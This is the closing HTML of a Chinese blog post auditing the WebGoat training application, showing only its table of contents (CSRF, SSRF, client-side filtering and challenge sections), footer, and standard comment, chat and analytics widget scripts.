class="toc-link" href="#CSRFLogin"><span class="toc-number">16.26.7.</span> <span class="toc-text">CSRFLogin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf"><span class="toc-number">16.27.</span> <span class="toc-text">ssrf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF"><span class="toc-number">16.27.1.</span> <span class="toc-text">SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRFTask1"><span class="toc-number">16.27.2.</span> <span class="toc-text">SSRFTask1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRFTask2"><span class="toc-number">16.27.3.</span> <span class="toc-text">SSRFTask2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-restrictions"><span class="toc-number">16.28.</span> <span class="toc-text">bypass_restrictions</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BypassRestrictions"><span class="toc-number">16.28.1.</span> <span class="toc-text">BypassRestrictions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BypassRestrictionsFieldRestrictions"><span class="toc-number">16.28.2.</span> <span class="toc-text">BypassRestrictionsFieldRestrictions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BypassRestrictionsFrontendValidation"><span class="toc-number">16.28.3.</span> <span class="toc-text">BypassRestrictionsFrontendValidation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#client-side-filtering"><span class="toc-number">16.29.</span> <span class="toc-text">client_side_filtering</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ClientSideFiltering"><span class="toc-number">16.29.1.</span> <span class="toc-text">ClientSideFiltering</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ClientSideFilteringAssignment"><span class="toc-number">16.29.2.</span> <span class="toc-text">ClientSideFilteringAssignment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Salaries"><span class="toc-number">16.29.3.</span> <span class="toc-text">Salaries</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ClientSideFilteringFreeAssignment"><span class="toc-number">16.29.4.</span> <span class="toc-text">ClientSideFilteringFreeAssignment</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#html-tampering"><span class="toc-number">16.30.</span> <span class="toc-text">html_tampering</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HtmlTampering"><span class="toc-number">16.30.1.</span> <span class="toc-text">HtmlTampering</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HtmlTamperingTask"><span class="toc-number">16.30.2.</span> <span class="toc-text">HtmlTamperingTask</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#challenges"><span class="toc-number">16.31.</span> <span class="toc-text">challenges</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ChallengeIntro"><span class="toc-number">16.31.1.</span> <span class="toc-text">ChallengeIntro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag"><span class="toc-number">16.31.2.</span> <span class="toc-text">Flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SolutionConstants"><span class="toc-number">16.31.3.</span> <span class="toc-text">SolutionConstants</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#challenge1"><span class="toc-number">16.31.4.</span> <span class="toc-text">challenge1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Challenge1"><span class="toc-number">16.31.4.1.</span> <span class="toc-text">Challenge1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ImageServlet"><span class="toc-number">16.31.4.2.</span> <span class="toc-text">ImageServlet</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Assignment1"><span class="toc-number">16.31.4.3.</span> <span class="toc-text">Assignment1</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#challenge5"><span class="toc-number">16.31.5.</span> <span class="toc-text">challenge5</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Challenge5"><span class="toc-number">16.31.5.1.</span> <span class="toc-text">Challenge5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Assignment5"><span class="toc-number">16.31.5.2.</span> <span class="toc-text">Assignment5</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#challenge7"><span class="toc-number">16.31.6.</span> <span class="toc-text">challenge7</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Challenge7"><span class="toc-number">16.31.6.1.</span> <span class="toc-text">Challenge7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Email-2"><span class="toc-number">16.31.6.2.</span> <span class="toc-text">Email</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MD5"><span class="toc-number">16.31.6.3.</span> <span class="toc-text">MD5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PasswordResetLink"><span class="toc-number">16.31.6.4.</span> <span class="toc-text">PasswordResetLink</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Assignment7"><span class="toc-number">16.31.6.5.</span> <span class="toc-text">Assignment7</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#challenge8"><span class="toc-number">16.31.7.</span> <span class="toc-text">challenge8</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Challenge8"><span class="toc-number">16.31.7.1.</span> <span class="toc-text">Challenge8</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Assignment8"><span class="toc-number">16.31.7.2.</span> <span class="toc-text">Assignment8</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%93%E5%B0%BE"><span class="toc-number">17.</span> <span class="toc-text">结尾</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background: linear-gradient(20deg, #0062be, #925696, #cc426e, #fb0347)"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2023 By wanan</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'RjFSSKpeg1lxuvDjmLndzaLO-MdYXbMMI',
      appKey: '8qrAyIwMaJTebKjjzPnV0SFT',
      avatar: 'monsterid',
      serverURLs: 'https://valine.wanan.red',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://www.wanan.red/77b05baa.html'
    this.page.identifier = '/77b05baa.html'
    this.page.title = 'webgoat靶场审计'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://www-wanan-red.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }

  document.getElementById('darkmode').addEventListener('click', () => {
    setTimeout(() => window.disqusReset(), 200)
  })
}

if ('Valine' === 'Disqus' || !false) {
  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script>(function(d, w, c) {
    w.ChatraID = 'LAbfxFAsFCbvYgjHY';
    var s = d.createElement('script');
    w[c] = w[c] || function() {
        (w[c].q = w[c].q || []).push(arguments);
    };
    s.async = true;
    s.src = 'https://call.chatra.io/chatra.js';
    if (d.head) d.head.appendChild(s);
})(document, window, 'Chatra');

if (true) {
  var chatBtnFn = () => {
    var chatBtn = document.getElementById("chat_btn")
    chatBtn.addEventListener("click", function(){
      Chatra('openChat')
    });
  }
  chatBtnFn()
} else {
  if (false) {
    function chatBtnHide () {
      Chatra('hide')
    }
    function chatBtnShow () {
      Chatra('show')
    }
  }
}</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>